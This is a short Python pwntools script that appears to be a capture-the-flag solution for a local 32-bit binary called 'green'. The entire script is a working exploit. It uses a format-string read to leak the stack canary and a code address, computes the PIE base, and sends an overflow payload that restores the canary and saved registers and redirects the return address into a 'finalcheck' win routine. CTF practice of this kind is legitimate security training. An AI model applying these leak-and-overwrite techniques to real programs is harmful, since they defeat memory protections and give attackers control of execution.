from pwn import *

elf = ELF("./green")
p = process("./green")

p.sendline(b"%15$p.%19$p")
p.recvline()

# resolve leaks
canary, leak = [int(i, 16) for i in p.recvline().strip().split(b".")]
elf.address = leak - 81 - elf.sym.main

if args.GDB:
    gdb.attach(p)

payload = fit(
    {
        0x20: p32(canary),                      # FIX CANARY
        0x28: p32(elf.address + 0x3fb4),         # FIX EBX
        0x2C: p32(elf.address + 0x4200),        # FIX EBP
        0x30: p32(elf.sym.finalcheck + 73),     # WIN
    }
)
p.sendline(payload)

p.interactive()
